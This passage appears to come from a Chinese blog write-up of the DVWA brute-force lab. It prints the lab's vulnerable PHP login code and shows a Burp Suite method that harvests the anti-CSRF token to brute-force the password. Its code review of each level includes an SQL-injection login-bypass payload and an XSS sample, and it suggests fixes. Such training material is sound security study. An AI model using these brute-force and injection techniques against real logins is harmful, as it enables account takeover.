Level（开发者使用了”CSRF”的反伪造请求，有一个旧的说法表示这种保护可以阻止暴力攻击，但事实并非如此。这个级别扩展了中等级别，在登录失败时等待，但这次是 2 到 4 秒之间的随机时间，这样做的目的是试图混淆任何时间预测。使用验证码表单可能会产生与 CSRF 令牌类似的效果。）"></a>High Level（开发者使用了”CSRF”的反伪造请求，有一个旧的说法表示这种保护可以阻止暴力攻击，但事实并非如此。这个级别扩展了中等级别，在登录失败时等待，但这次是 2 到 4 秒之间的随机时间，这样做的目的是试图混淆任何时间预测。使用验证码表单可能会产生与 CSRF 令牌类似的效果。）</h3><h4 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="title function_ invoke__">sleep</span>( <span class="title function_ invoke__">rand</span>( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>High 级别的代码使用了stripslashes 函数，进一步过滤输入的内容。同时使用了 Token 抵御 CSRF 攻击，在每次登录时网页会随机生成一个 user_token 参数，在用户提交用户名和密码时要对 token 进行检查再进行 sql 查询。</p><p>Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码</p><p>写一段python脚本查询：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">r=requests.get(<span class="string">&quot;http://192.168.239.1/DVWA/vulnerabilities/brute/?username=admin&amp;password=password&amp;Login=Login&amp;user_token=a9427c593c12feca4bf502f3106af547#&quot;</span>)</span><br><span class="line">demo=r.text</span><br><span class="line">soup=BeautifulSoup(demo,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(soup.prettify())</span><br></pre></td></tr></table></figure><p>发现每次的user_token都是不一样的，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250411203400372.png" alt="image-20250411203400372"></p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250411203412676.png" alt="image-20250411203412676"></p><p>这里有两种思路:</p><ul><li><p>第一种方法：</p><p>也是先使用BP抓包，然后我们使用Pitchfork模式，为password和token添加变量进行爆破，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250411210135432.png" alt="image-20250411210135432"></p></li></ul><p>第一个username导入本地爆破字典，然后第二个token我们打开右边的setting找到Grep-Extract点击add添加</p><blockquote><h3 id="Grep-Extract的基本用法"><a href="#Grep-Extract的基本用法" class="headerlink" title="Grep-Extract的基本用法"></a>Grep-Extract的基本用法</h3><p>Grep-Extract功能允许用户通过正则表达式来匹配和提取HTTP请求或响应中的特定数据。用户可以在Burp Suite的Intruder模块中使用Grep-Extract，通过设置特定的正则表达式来过滤和提取需要的数据。例如，在SQL注入测试中，可以使用Grep-Extract来提取数据库中的表名或列名‌</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250411211035463.png" alt="image-20250411211035463"></p><p>上述的value值等会自动生成，然后点击OK。在Payloads加载界面为token变量设置Payload type为Recursive grep递归模式，同时设置initial payload for first request要为刚刚在Grep-Extract中的token值，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250411214032846.png" alt="image-20250411214032846"></p><p>然后爆破找到密码为password:</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250411213953437.png" alt="image-20250411213953437"></p><p>然后成功登录:</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250411214109324.png" alt="image-20250411214109324"></p><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="Low-Level"><a href="#Low-Level" class="headerlink" title="Low Level"></a>Low Level</h3><h3 id="✅-正常功能部分"><a href="#✅-正常功能部分" class="headerlink" title="✅ 正常功能部分"></a>✅ 正常功能部分</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br></pre></td></tr></table></figure><ul><li>如果 URL 中设置了 <code>Login</code> 参数，就执行登录流程。</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br></pre></td></tr></table></figure><ul><li>从 GET 参数中获取用户名和密码，并用 <code>md5</code> 对密码进行哈希（这已经过时，后面详说）。</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><ul><li>构造 SQL 查询语句来验证用户身份。</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( ... );</span><br></pre></td></tr></table></figure><ul><li>使用 mysqli 查询数据库，如果失败就打印错误。</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br></pre></td></tr></table></figure><ul><li>如果查到一个匹配的用户，就说明登录成功。</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$row</span>    = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> );</span><br><span class="line"><span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><ul><li>显示欢迎信息和头像。</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br></pre></td></tr></table></figure><ul><li>关闭数据库连接。</li></ul><hr><h3 id="⚠️-存在的安全问题分析"><a href="#⚠️-存在的安全问题分析" class="headerlink" title="⚠️ 存在的安全问题分析"></a>⚠️ 存在的安全问题分析</h3><h4 id="1-🚨-SQL-注入漏洞"><a href="#1-🚨-SQL-注入漏洞" class="headerlink" title="1. 🚨 SQL 注入漏洞"></a>1. 🚨 SQL 注入漏洞</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><ul><li><p>直接把用户输入拼接进 SQL 语句，容易被 SQL 注入攻击。</p></li><li><p>示例攻击：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27; --&amp;password=123</span><br></pre></td></tr></table></figure><p>这会让原始 SQL 查询变成：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> `users` <span class="keyword">WHERE</span> <span class="keyword">user</span> <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="comment">--&#x27; AND password = &#x27;md5hash&#x27;;</span></span><br></pre></td></tr></table></figure><p><code>--</code> 表示注释，后面被忽略，导致密码验证被绕过。</p></li></ul><h4 id="✅-修复方法："><a href="#✅-修复方法：" class="headerlink" title="✅ 修复方法："></a>✅ 修复方法：</h4><p>使用 <strong>预处理语句（prepared statements）</strong>：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE user = ? AND password = ?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$user</span>, <span class="variable">$pass</span>);</span><br></pre></td></tr></table></figure><hr><h4 id="2-🔒-弱密码哈希（使用了-md5）"><a href="#2-🔒-弱密码哈希（使用了-md5）" class="headerlink" title="2. 🔒 弱密码哈希（使用了 md5）"></a>2. 🔒 弱密码哈希（使用了 md5）</h4><ul><li><p><code>md5</code> 已被认为<strong>不安全</strong>，容易被彩虹表或暴力破解。</p></li><li><p>应使用 <code>password_hash()</code> 和 <code>password_verify()</code> 进行密码加密与校验：</p></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 注册时保存：</span></span><br><span class="line"><span class="variable">$password_hash</span> = <span class="title function_ invoke__">password_hash</span>(<span class="variable">$password</span>, PASSWORD_DEFAULT);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 登录时验证：</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">password_verify</span>(<span class="variable">$input_password</span>, <span class="variable">$password_hash</span>)) &#123; ... &#125;</span><br></pre></td></tr></table></figure><hr><h4 id="3-📥-使用-GET-提交密码"><a href="#3-📥-使用-GET-提交密码" class="headerlink" title="3. 📥 使用 GET 提交密码"></a>3. 📥 使用 GET 提交密码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]</span><br></pre></td></tr></table></figure><ul><li><p>密码作为 URL 参数发送，<strong>很容易泄露</strong>，例如：</p><ul><li><p>浏览器历史记录</p></li><li><p>日志文件</p></li><li><p>网络嗅探</p></li></ul></li></ul><p>✅ 应使用 POST 提交表单数据，并通过 <code>$_POST</code> 获取。</p><hr><h4 id="4-📤-XSS（跨站脚本）风险"><a href="#4-📤-XSS（跨站脚本）风险" class="headerlink" title="4. 📤 XSS（跨站脚本）风险"></a>4. 📤 XSS（跨站脚本）风险</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><ul><li>如果用户名中有 HTML/JS 代码，会被直接输出，导致 XSS。</li></ul><p>✅ 使用 <code>htmlspecialchars()</code> 进行转义：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$user</span>) . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><hr><h3 id="🔚-总结：这段代码的问题汇总"><a href="#🔚-总结：这段代码的问题汇总" class="headerlink" title="🔚 总结：这段代码的问题汇总"></a>🔚 总结：这段代码的问题汇总</h3><div class="table-container"><table><thead><tr><th>问题</th><th>风险级别</th><th>修复建议</th></tr></thead><tbody><tr><td>SQL 注入</td><td>高</td><td>使用预处理语句</td></tr><tr><td>使用 md5 加密密码</td><td>高</td><td>使用 password_hash</td></tr><tr><td>GET 提交敏感信息</td><td>中</td><td>使用 POST 方法</td></tr><tr><td>没有转义用户输出（XSS）</td><td>中</td><td>使用 htmlspecialchars</td></tr><tr><td>弱错误处理方式</td><td>低</td><td>日志记录+用户友好提示</td></tr></tbody></table></div><h3 id="Medium-Level"><a href="#Medium-Level" class="headerlink" title="Medium Level"></a>Medium Level</h3><p>这段代码相比你上一次发的版本，做了一些<strong>改进</strong>，主要是增加了对用户输入的<strong>转义处理（<code>mysqli_real_escape_string</code>）</strong>，来<strong>减缓 SQL 注入的风险</strong>，并在登录失败时加入了一个 <code>sleep(2)</code> 延迟来<strong>防止暴力破解</strong>。但<strong>仍然存在很多安全问题和过时的做法</strong>。我们继续逐点分析：</p><hr><h2 id="✅-改进的地方"><a href="#✅-改进的地方" class="headerlink" title="✅ 改进的地方"></a>✅ 改进的地方</h2><h3 id="1-使用-mysqli-real-escape-string-对用户名和密码进行转义"><a href="#1-使用-mysqli-real-escape-string-对用户名和密码进行转义" class="headerlink" title="1. 使用 mysqli_real_escape_string 对用户名和密码进行转义"></a>1. 使用 <code>mysqli_real_escape_string</code> 对用户名和密码进行转义</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$conn</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$conn</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>✅ 这比直接拼接更安全，防止一些基本的 SQL 注入攻击。</p><hr><h3 id="2-登录失败加了-sleep-2"><a href="#2-登录失败加了-sleep-2" class="headerlink" title="2. 登录失败加了 sleep(2)"></a>2. 登录失败加了 <code>sleep(2)</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">sleep</span>( <span class="number">2</span> );</span><br></pre></td></tr></table></figure><p>✅ 这是一个很基础的<strong>反暴力破解保护</strong>，防止脚本快速尝试密码。但仅靠这个远远不够。</p><hr><h2 id="❌-仍然存在的问题和风险"><a href="#❌-仍然存在的问题和风险" class="headerlink" title="❌ 仍然存在的问题和风险"></a>❌ 仍然存在的问题和风险</h2><h3 id="1-❗-SQL-注入风险仍然存在"><a href="#1-❗-SQL-注入风险仍然存在" class="headerlink" title="1. ❗ SQL 注入风险仍然存在"></a>1. ❗ SQL 注入风险仍然存在</h3><p>虽然用了 <code>mysqli_real_escape_string</code>，但<strong>这不是完全防护</strong>，尤其是面对复杂或绕过型注入。<strong>正确的做法是使用预处理语句（prepared statements）</strong>。</p><p>✅ 正确用法示例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE user = ? AND password = ?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$user</span>, <span class="variable">$pass</span>);</span><br></pre></td></tr></table></figure><hr><h3 id="2-❗-使用-md5-加密密码-——-非常不安全"><a href="#2-❗-使用-md5-加密密码-——-非常不安全" class="headerlink" title="2. ❗ 使用 md5 加密密码 —— 非常不安全"></a>2. ❗ 使用 <code>md5</code> 加密密码 —— 非常不安全</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>);</span><br></pre></td></tr></table></figure><ul><li><p><code>md5</code> 已被完全淘汰，能被秒破，甚至有公开反查库。</p></li><li><p>应使用 <code>password_hash()</code> + <code>password_verify()</code>。</p></li></ul><p>✅ 替代方式：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 注册时存入：</span></span><br><span class="line"><span class="variable">$hashed_password</span> = <span class="title function_ invoke__">password_hash</span>(<span class="variable">$password</span>, PASSWORD_DEFAULT);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 登录时验证：</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">password_verify</span>(<span class="variable">$input_password</span>, <span class="variable">$hashed_password</span>)) &#123; ... &#125;</span><br></pre></td></tr></table></figure><hr><h3 id="3-❗-仍使用-GET-请求传递敏感信息"><a href="#3-❗-仍使用-GET-请求传递敏感信息" class="headerlink" title="3. ❗ 仍使用 GET 请求传递敏感信息"></a>3. ❗ 仍使用 GET 请求传递敏感信息</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]</span><br></pre></td></tr></table></figure><ul><li><p>使用 GET 会将用户名和密码暴露在 URL 中（浏览器历史、日志、代理服务器都会记录）。</p></li><li><p>应使用 POST 提交表单。</p></li></ul><p>✅ 用法：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">action</span>=<span class="string">&quot;login.php&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]</span><br></pre></td></tr></table></figure><hr><h3 id="4-❗-输出未经过转义，存在-XSS-风险"><a href="#4-❗-输出未经过转义，存在-XSS-风险" class="headerlink" title="4. ❗ 输出未经过转义，存在 XSS 风险"></a>4. ❗ 输出未经过转义，存在 XSS 风险</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><ul><li>如果用户名是 <code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>，就会被浏览器执行。</li></ul><p>✅ 使用 <code>htmlspecialchars</code> 转义输出：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$user</span>, ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>) . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><hr><h3 id="5-❗-不安全的数据库错误信息暴露"><a href="#5-❗-不安全的数据库错误信息暴露" class="headerlink" title="5. ❗ 不安全的数据库错误信息暴露"></a>5. ❗ 不安全的数据库错误信息暴露</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>(...) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br></pre></td></tr></table></figure><ul><li><p>把数据库错误暴露给用户是一个安全隐患。攻击者可以据此构造攻击。</p></li><li><p>正确做法是：记录日志，展示通用错误信息。</p></li></ul><hr><h2 id="✅-总结与建议"><a href="#✅-总结与建议" class="headerlink" title="✅ 总结与建议"></a>✅ 总结与建议</h2><div class="table-container"><table><thead><tr><th>问题/改进</th><th>现状</th><th>建议</th></tr></thead><tbody><tr><td>SQL 注入防护</td><td>使用了 <code>mysqli_real_escape_string</code>，但还不够</td><td>✅ 使用 prepared statements</td></tr><tr><td>密码哈希</td><td>使用 <code>md5</code>（不安全）</td><td>✅ 改用 <code>password_hash</code> / <code>password_verify</code></td></tr><tr><td>请求方式</td><td>使用 GET（不安全）</td><td>✅ 改用 POST</td></tr><tr><td>XSS 防护</td><td>用户输出未转义</td><td>✅ 使用 <code>htmlspecialchars()</code></td></tr><tr><td>错误信息</td><td>暴露数据库错误</td><td>✅ 隐藏详细错误，只写日志</td></tr><tr><td>暴力破解防护</td><td>使用 <code>sleep(2)</code></td><td>✅ 可以进一步引入登录失败计数机制</td></tr></tbody></table></div><hr><h3 id="High-Level"><a href="#High-Level" class="headerlink" title="High Level"></a>High Level</h3><p>这段 PHP 代码是一个带有 <strong>CSRF 防护、基本 SQL 查询和登录逻辑</strong> 的登录处理脚本。它在你前面发的版本基础上，又增加了一些<strong>安全性</strong>，比如：</p><ul><li><p>✅ 增加了 <strong>CSRF Token 检查</strong></p></li><li><p>✅ 添加了 <code>stripslashes()</code> 去除魔术引号（在老版本 PHP 中可能有用）</p></li><li><p>✅ 登录失败时加入了 <strong>随机 sleep 时间</strong> 来抵抗爆破</p></li><li><p>❌ 但仍然存在几个关键的安全问题</p></li></ul><hr><h2 id="🧩-一步步分析"><a href="#🧩-一步步分析" class="headerlink" title="🧩 一步步分析"></a>🧩 一步步分析</h2><h3 id="✅-1-检查是否提交了登录请求"><a href="#✅-1-检查是否提交了登录请求" class="headerlink" title="✅ 1. 检查是否提交了登录请求"></a>✅ 1. 检查是否提交了登录请求</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br></pre></td></tr></table></figure><ul><li>表示是一个通过 GET 请求提交的登录表单（<strong>不推荐</strong>，敏感信息暴露在 URL 中）</li></ul><hr><h3 id="✅-2-CSRF-Token-检查"><a href="#✅-2-CSRF-Token-检查" class="headerlink" title="✅ 2. CSRF Token 检查"></a>✅ 2. CSRF Token 检查</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br></pre></td></tr></table></figure><ul><li><p>这是对<strong>跨站请求伪造（CSRF）</strong>的防护。</p></li><li><p><code>user_token</code> 是表单提交的，<code>session_token</code> 是服务端生成的。</p></li><li><p>如果验证失败，通常会重定向或退出（<code>checkToken()</code> 函数你没贴出来，但应该做了这些）。</p></li></ul><hr><h3 id="✅-3-输入处理：去除转义-SQL-转义"><a href="#✅-3-输入处理：去除转义-SQL-转义" class="headerlink" title="✅ 3. 输入处理：去除转义 + SQL 转义"></a>✅ 3. 输入处理：去除转义 + SQL 转义</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ] );</span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>( ..., <span class="variable">$user</span> );</span><br><span class="line"></span><br><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ] );</span><br><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>( ..., <span class="variable">$pass</span> );</span><br><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br></pre></td></tr></table></figure><ul><li><p>✅ <code>stripslashes()</code>：去掉魔术引号（PHP 5.x 遗留问题）</p></li><li><p>✅ <code>mysqli_real_escape_string()</code>：防止基本 SQL 注入</p></li><li><p>❌ 